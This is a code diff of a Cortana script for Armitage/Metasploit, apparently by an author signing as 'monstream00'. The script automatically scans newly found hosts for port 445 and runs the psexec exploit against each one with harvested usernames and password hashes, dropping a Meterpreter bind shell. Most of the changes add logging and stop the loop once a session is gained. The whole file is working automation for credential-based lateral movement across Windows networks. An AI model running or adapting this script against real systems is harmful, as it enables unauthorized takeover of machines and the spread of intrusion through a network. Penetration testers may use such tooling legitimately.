@@ -1,8 +1,15 @@
 #
 # This script waits for a box with port 445 open to appear and it launches
 # auto PSEXEC exploit any Windows boxes
+#  __      __.__           _________                         ._._._.
+# /  \    /  \__| ____    /   _____/____   __ __   ____  ____| | | |
+# \   \/\/   /  |/    \   \_____  \\__  \ |  |  \_/ ___\/ __ \ | | |
+#  \        /|  |   |  \  /        \/ __ \|  |  /\  \__\  ___/\|\|\|
+#   \__/\  / |__|___|  / /_______  (____  /____/  \___  >___  >_____
+#        \/          \/          \/     \/            \/    \/\/\/\/
 # by monstream00
 
+#add credentials to array
 on credential_add {
 	#sleep(2 * 1000);
 	if ("IUSR*" !iswm $3) {
@@ -52,31 +59,35 @@ on service_add_445 {
 	}
 }
 
-on session_close {
-	println("[*] Session $1 closed. Trying to recover " . session_host($1) . " with PSEXEC!");
-	$console = console();
-	if (host_session($1) is $null) {
-		cmd($console, "hosts -c address,mac");
-	}
-}
+#on session_close {
+#	#session_host($1) is null cuz session not there anymore find new way
+#	println("[*] Session $1 closed. Trying to recover " . session_host($1) . " with PSEXEC!");
+#	$closedHost = session_host($1);
+#	$console = console();
+#	cmd($console, "echo [*] `date` Session $1 closed. Trying to recover $closedHost with PSEXEC! >> /opt/metasploit/msf3/data/armitage/cortana.log");
+#	if (host_session($1) is $null) {
+#		cmd($console, "hosts -c address,mac");
+#	}
+#}
 
 on host_add {
 	$console = console();
 	#$console = open_console_tab("AutoPsexec_hostadd_$1"); #Debug use
 	#speed up PSEXEC pass the hash cortana script
-	println("[*] msfScanning 445 TCP check on $1");
-	cmd($console, "use auxiliary/scanner/portscan/tcp");
-	cmd($console, "set THREADS 5");
-	cmd($console, "set PORTS 445");
-	cmd($console, "set RHOSTS $1");
-	cmd($console, "run -j");
-	sleep(10 * 1000);
 	if (host_session($1) is $null) {
-		cmd($console, "hosts -c address,mac");
+		println("[*] msfScanning 445 TCP check on $1");
+		cmd($console, "echo [*] `date` msfScanning 445 TCP check on $1 >> /opt/metasploit/msf3/data/armitage/cortana.log");
+		cmd($console, "use auxiliary/scanner/portscan/tcp");
+		cmd($console, "set THREADS 5");
+		cmd($console, "set PORTS 445, 21");
+		cmd($console, "set RHOSTS $1");
+		cmd($console, "run -j");
+		sleep(10 * 1000);
 	}
 	db_sync(); 
 }
 
+#Check if port 445 is open
 on console_hosts {
 	#sleep(5 * 1000);
 	# which host are we dealing also check if 445 is open with services -S IP_Addres -p 445
@@ -95,16 +106,23 @@ on console_hosts {
 	}
 }
 
+#If port 445 open try each username and hash value in array via psexec 
 on console_services {
 	#sleep(5 * 1000);
 	# which host are we dealing also check if 445 is open with services -S IP_Addres -p 445
 	#println("=====================================================");
 	#println("Console_Services Start");
 	#println("=====================================================");
+	#$console = console();
 	@validIPs_services = parse_table($3, @("host", "port", "proto", "name", "state", "info"));
 	foreach $validIPs_services (@validIPs_services) {
 		#$host = $null;
 		($validIP_services, $notimportant1, $notimportant2, $notimportant3, $notimportant4, $notimportant5) = values($validIPs_services, @('host', 'port', 'proto', 'name', 'state', 'info'));
+		if (host_session($validIP_services) !is $null) {
+			println("[*] Got session stopping autoPSEXEC on host $validIP_services");
+			cmd($console, "echo [*] `date` Got session stopping autoPSEXEC on host $validIP_services >> /opt/metasploit/msf3/data/armitage/cortana.log");	
+			break;
+		}		
 		$host = host_session($validIP_services);
 		#If $host null then no sessions!!!!
 		if ($host eq $null) {
@@ -117,16 +135,18 @@ on console_services {
 					#println("[*] host_sessions: " . host_session($validIP_services));
 					if (host_session($validIP_services) is $null) {	
 						println("[*] Testing Host: $validIP_services with: $usernamee , $passwordd");
-						$console = console();				
+						$console = console();	
+						cmd($console, "echo [*] `date` Testing Host: $validIP_services with: $usernamee , $passwordd >> /opt/metasploit/msf3/data/armitage/cortana.log");			
 						cmd($console, "use exploit/windows/smb/psexec");
 						cmd_set($console, %(RHOST => "$validIP_services", PAYLOAD => "windows/meterpreter/bind_tcp", SMBUser => "$usernamee", SMBPass => "$passwordd"));
 						cmd($console, "exploit -j");
-						#println("[*] Going to sleep for 15 seconds.");
+						println("[*] Checking for session please wait for about 20 seconds.");
 						sleep(20 * 1000);
 						#println("[*] Wakeing Up.");
 					}
 					if (host_session($validIP_services) !is $null) {
 						println("[*] Got session stopping autoPSEXEC on host $validIP_services");
+						cmd($console, "echo [*] `date` Got session stopping autoPSEXEC on host $validIP_services >> /opt/metasploit/msf3/data/armitage/cortana.log");	
 						break;
 					}			
 					$countery += 1;
@@ -140,6 +160,10 @@ on console_services {
 }
 
 
-on session_open {
-	println("[*] Session $1 opened. I got " . session_host($1) . " with " . session_exploit($1));
-}
+#on session_open {
+#	println("[*] Session $1 opened. I got " . session_host($1) . " with " . session_exploit($1));
+#	$theHost = session_host($1);
+#	$theExploit = session_exploit($1);
+#	$console = console();	
+#	cmd($console, "echo [*] `date` Session $1 opened. I got $theHost with $theExploit >> /opt/metasploit/msf3/data/armitage/cortana.log");			
+#}
